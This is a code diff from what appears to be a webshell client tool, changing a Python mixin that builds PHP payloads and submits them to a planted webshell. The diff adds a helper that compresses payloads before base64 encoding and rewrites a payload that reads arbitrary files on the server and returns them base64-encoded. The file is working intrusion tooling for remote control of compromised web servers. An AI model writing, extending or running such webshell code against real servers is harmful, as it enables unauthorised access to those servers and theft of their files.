@@ -1,11 +1,14 @@
-import typing as t
-import logging
-import random
-import string
 import base64
 import json
+import logging
+import random
+import re
+import string
+import typing as t
 from dataclasses import dataclass
+
 import httpx
+
 from ..utils import random_english_words
 from .base import Session, DirectoryEntry
 from .exceptions import *
@@ -26,6 +29,10 @@ class PHPWebshellOptions:
 
     encoder: t.Literal["raw", "base64"] = "raw"
     http_params_obfs: bool = False  # TODO: remove me
+
+def compress_php_code(source: str) -> str:
+    source = re.sub("(#|//).+\n", "\n", source)
+    return re.sub(r"(?<=[\{\};])\n? +", "", source)
 
 
 class PHPWebshellMixin:
@@ -74,8 +81,6 @@ class PHPWebshellMixin:
         }
         echo json_encode($result);
         """.replace(
-            "    ", ""
-        ).replace(
             "DIR_PATH", repr(dir_path)
         )
         json_result = await self.submit(php_code)
@@ -108,16 +113,17 @@ class PHPWebshellMixin:
         php_code = """
         $filePath = FILE_PATH;
         if(!is_file($filePath)) {
-            die("WRONG_NOT_FILE");
+            echo "WRONG_NOT_FILE";
         }
-        if(!is_readable($filePath)) {
-            die("WRONG_NO_PERMISSION");
+        else if(!is_readable($filePath)) {
+            echo "WRONG_NO_PERMISSION";
         }
-        if(filesize($filePath) > MAX_SIZE) {
-            die("WRONG_FILE_TOO_LARGE");
+        else if(filesize($filePath) > MAX_SIZE) {
+            echo "WRONG_FILE_TOO_LARGE";
+        }else {
+            $content = file_get_contents($filePath);
+            echo base64_encode($content);
         }
-        $content = file_get_contents($filePath);
-        echo base64_encode($content);
         """.replace(
             "FILE_PATH", repr(filepath)
         ).replace(
@@ -160,6 +166,7 @@ class PHPWebshellMixin:
             delimiter_stop=stop,
             payload_raw=payload,
         )
+        payload = compress_php_code(payload)
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
         if status_code != 200:
